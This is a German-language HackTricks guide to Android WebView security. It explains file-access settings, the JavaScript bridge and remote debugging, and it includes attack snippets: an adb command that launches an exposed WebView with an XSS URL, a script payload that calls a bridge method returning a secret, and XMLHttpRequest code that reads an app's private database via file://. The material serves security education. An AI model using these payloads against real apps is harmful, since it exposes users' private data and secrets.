# Webview-Angriffe

{% hint style="success" %}
Lernen & √ºben Sie AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lernen & √ºben Sie GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtzen Sie HackTricks</summary>

* √úberpr√ºfen Sie die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs zu den** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichen.

</details>
{% endhint %}

## Anleitung zu WebView-Konfigurationen und Sicherheit

### √úbersicht √ºber WebView-Schwachstellen

Ein kritischer Aspekt der Android-Entwicklung ist der korrekte Umgang mit WebViews. Diese Anleitung hebt wichtige Konfigurationen und Sicherheitspraktiken hervor, um Risiken im Zusammenhang mit der Nutzung von WebViews zu mindern.

![WebView-Beispiel](<../../.gitbook/assets/image (1190).png>)

### **Dateizugriff in WebViews**

Standardm√§√üig erlauben WebViews den Dateizugriff. Diese Funktionalit√§t wird durch die Methode `setAllowFileAccess()` gesteuert, die seit Android API Level 3 (Cupcake 1.5) verf√ºgbar ist. Anwendungen mit der Berechtigung **android.permission.READ\_EXTERNAL\_STORAGE** k√∂nnen Dateien aus dem externen Speicher √ºber ein Dateischema (`file://path/to/file`) lesen.

#### **Veraltete Funktionen: Universeller und Dateizugriff von URLs**

* **Universeller Zugriff von Datei-URLs**: Diese veraltete Funktion erlaubte Cross-Origin-Anfragen von Datei-URLs, was ein erhebliches Sicherheitsrisiko aufgrund potenzieller XSS-Angriffe darstellt. Die Standardeinstellung ist deaktiviert (`false`) f√ºr Apps, die auf Android Jelly Bean und neuer abzielen.
* Um diese Einstellung zu √ºberpr√ºfen, verwenden Sie `getAllowUniversalAccessFromFileURLs()`.
* Um diese Einstellung zu √§ndern, verwenden Sie `setAllowUniversalAccessFromFileURLs(boolean)`.
* **Dateizugriff von Datei-URLs**: Diese ebenfalls veraltete Funktion steuerte den Zugriff auf Inhalte von anderen Dateischema-URLs. Wie der universelle Zugriff ist auch hier die Standardeinstellung deaktiviert, um die Sicherheit zu erh√∂hen.
* Verwenden Sie `getAllowFileAccessFromFileURLs()`, um zu √ºberpr√ºfen, und `setAllowFileAccessFromFileURLs(boolean)`, um festzulegen.

#### **Sicheres Laden von Dateien**

Um den Zugriff auf das Dateisystem zu deaktivieren und dennoch auf Assets und Ressourcen zuzugreifen, wird die Methode `setAllowFileAccess()` verwendet. Mit Android R und h√∂her ist die Standardeinstellung `false`.

* √úberpr√ºfen Sie mit `getAllowFileAccess()`.
* Aktivieren oder deaktivieren Sie mit `setAllowFileAccess(boolean)`.

#### **WebViewAssetLoader**

Die **WebViewAssetLoader**-Klasse ist der moderne Ansatz zum Laden lokaler Dateien. Sie verwendet http(s)-URLs, um auf lokale Assets und Ressourcen zuzugreifen, was mit der Same-Origin-Policy √ºbereinstimmt und somit das CORS-Management erleichtert.

### loadUrl

Dies ist eine g√§ngige Funktion, die verwendet wird, um beliebige URLs in einem Webview zu laden:
```java
webview.loadUrl("<url here>")
```
Ofc, ein potenzieller Angreifer sollte niemals in der Lage sein, die **URL** zu **kontrollieren**, die eine Anwendung laden wird.

### **JavaScript und Intent-Schema-Verarbeitung**

* **JavaScript**: Standardm√§√üig in WebViews deaktiviert, kann es √ºber `setJavaScriptEnabled()` aktiviert werden. Vorsicht ist geboten, da das Aktivieren von JavaScript ohne angemessene Sicherheitsvorkehrungen Sicherheitsanf√§lligkeiten einf√ºhren kann.
* **Intent-Schema**: WebViews k√∂nnen das `intent`-Schema verarbeiten, was zu Exploits f√ºhren kann, wenn es nicht sorgf√§ltig verwaltet wird. Eine Beispielanf√§lligkeit betraf einen exponierten WebView-Parameter "support\_url", der ausgenutzt werden konnte, um Cross-Site-Scripting (XSS)-Angriffe auszuf√ºhren.

![Vulnerable WebView](<../../.gitbook/assets/image (1191).png>)

Beispiel f√ºr eine Ausnutzung mit adb:

{% code overflow="wrap" %}
```bash
adb.exe shell am start -n com.tmh.vulnwebview/.SupportWebView ‚Äìes support_url "https://example.com/xss.html"
```
{% endcode %}

### Javascript Bridge

Eine Funktion wird von Android bereitgestellt, die es **JavaScript** in einem WebView erm√∂glicht, **native Android-App-Funktionen** aufzurufen. Dies wird durch die Nutzung der Methode `addJavascriptInterface` erreicht, die JavaScript mit nativen Android-Funktionalit√§ten integriert, auch bekannt als _WebView JavaScript bridge_. Vorsicht ist geboten, da diese Methode allen Seiten innerhalb des WebView den Zugriff auf das registrierte JavaScript Interface-Objekt erm√∂glicht, was ein Sicherheitsrisiko darstellt, wenn sensible Informationen √ºber diese Schnittstellen offengelegt werden.

* **√Ñu√üerste Vorsicht ist erforderlich** f√ºr Apps, die auf Android-Versionen unter 4.2 abzielen, aufgrund einer Schwachstelle, die die Ausf√ºhrung von Remote-Code durch b√∂sartiges JavaScript erm√∂glicht, das Reflection ausnutzt.

#### Implementierung eines JavaScript Bridges

* **JavaScript-Schnittstellen** k√∂nnen mit nativen Code interagieren, wie in den Beispielen gezeigt, in denen eine Klassenmethode JavaScript zug√§nglich gemacht wird:
```javascript
@JavascriptInterface
public String getSecret() {
return "SuperSecretPassword";
};
```
* JavaScript Bridge wird aktiviert, indem eine Schnittstelle zum WebView hinzugef√ºgt wird:
```javascript
webView.addJavascriptInterface(new JavascriptBridge(), "javascriptBridge");
webView.reload();
```
* Potenzielle Ausnutzung durch JavaScript, zum Beispiel √ºber einen XSS-Angriff, erm√∂glicht das Aufrufen von exponierten Java-Methoden:
```html
<script>alert(javascriptBridge.getSecret());</script>
```
* Um Risiken zu mindern, **beschr√§nken Sie die Verwendung der JavaScript-Br√ºcke** auf Code, der mit der APK ausgeliefert wird, und verhindern Sie das Laden von JavaScript aus externen Quellen. F√ºr √§ltere Ger√§te setzen Sie die minimale API-Stufe auf 17.

### Reflexionsbasierte Remote-Code-Ausf√ºhrung (RCE)

* Eine dokumentierte Methode erm√∂glicht die Erreichung von RCE durch Reflexion, indem ein spezifisches Payload ausgef√ºhrt wird. Die `@JavascriptInterface`-Annotation verhindert jedoch unbefugten Methoden Zugriff und begrenzt die Angriffsfl√§che.

### Remote-Debugging

* **Remote-Debugging** ist mit **Chrome Developer Tools** m√∂glich, was Interaktion und beliebige JavaScript-Ausf√ºhrung innerhalb des WebView-Inhalts erm√∂glicht.

#### Aktivieren des Remote-Debuggings

* Remote-Debugging kann f√ºr alle WebViews innerhalb einer Anwendung aktiviert werden durch:
```java
if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
WebView.setWebContentsDebuggingEnabled(true);
}
```
* Um das Debugging bedingt basierend auf dem debuggable Zustand der Anwendung zu aktivieren:
```java
if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
if (0 != (getApplicationInfo().flags & ApplicationInfo.FLAG_DEBUGGABLE))
{ WebView.setWebContentsDebuggingEnabled(true); }
}
```
## Exfiltriere beliebige Dateien

* Demonstriert die Exfiltration beliebiger Dateien mithilfe einer XMLHttpRequest:
```javascript
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if (xhr.readyState == XMLHttpRequest.DONE) {
alert(xhr.responseText);
}
}
xhr.open('GET', 'file:///data/data/com.authenticationfailure.wheresmybrowser/databases/super_secret.db', true);
xhr.send(null);
```
## Referenzen

* [https://labs.integrity.pt/articles/review-android-webviews-fileaccess-attack-vectors/index.html](https://labs.integrity.pt/articles/review-android-webviews-fileaccess-attack-vectors/index.html)
* [https://github.com/authenticationfailure/WheresMyBrowser.Android](https://github.com/authenticationfailure/WheresMyBrowser.Android)
* [https://developer.android.com/reference/android/webkit/WebView](https://developer.android.com/reference/android/webkit/WebView)
* [https://medium.com/@justmobilesec/deep-links-webviews-exploitations-part-ii-5c0b118ec6f1](https://medium.com/@justmobilesec/deep-links-webviews-exploitations-part-ii-5c0b118ec6f1)
* [https://www.justmobilesec.com/en/blog/deep-links-webviews-exploitations-part-I](https://www.justmobilesec.com/en/blog/deep-links-webviews-exploitations-part-I)

{% hint style="success" %}
Lernen & √ºben Sie AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lernen & √ºben Sie GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtzen Sie HackTricks</summary>

* √úberpr√ºfen Sie die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.

</details>
{% endhint %}
